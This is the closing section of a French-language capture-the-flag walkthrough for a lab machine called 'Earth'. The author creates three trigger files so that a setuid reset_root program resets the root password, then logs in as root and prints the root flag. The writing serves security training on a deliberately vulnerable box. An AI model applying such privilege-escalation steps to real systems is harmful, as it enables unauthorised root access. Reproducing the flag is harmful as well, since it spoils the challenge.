@@ -233,3 +233,49 @@ write(1, "RESET FAILED, ALL TRIGGERS ARE N"..., 44RESET FAILED, ALL TRIGGERS ARE
 exit_group(0)                           = ?
 +++ exited with 0 +++
 ```
+
+Je vais créer les fichiers attendus :
+```
+touch /dev/shm/kHgTFI5G
+touch /dev/shm/Zw7bV9U5
+touch /tmp/kcM0Wewe
+```
+
+Puis je relance le programme ```/usr/bin/reset_root``` :
+```
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+```
+
+Ensuite, je n'ai plus qu'à me connecter et à chercher le flag :
+```
+cat /root/root_flag.txt
+
+              _-o#&&*''''?d:>b\_
+          _o/"`''  '',, dMF9MMMMMHo_
+       .o&#'        `"MbHMMMMMMMMMMMHo.
+     .o"" '         vodM*$&&HMMMMMMMMMM?.
+    ,'              $M&ood,~'`(&##MMMMMMH\
+   /               ,MMMMMMM#b?#bobMMMMHMMML
+  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
+ ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
+|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
+$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
+]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
+MMMMMb_                   |MMMMMMMMMMMP'     :
+HMMMMMMMHo                 `MMMMMMMMMT       .
+?MMMMMMMMP                  9MMMMMMMM}       -
+-?MMMMMMM                  |MMMMMMMMM?,d-    '
+ :|MMMMMM-                 `MMMMMMMT .M|.   :
+  .9MMM[                    &MMMMM*' `'    .
+   :9MMk                    `MMM#"        -
+     &M}                     `          .-
+      `&.                             .
+        `~,   .                     ./
+            . _                  .-
+              '`--._,dd###pp=""'
+
+Congratulations on completing Earth!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_b0da9554d29db2117b02aa8b66ec492e]
+```
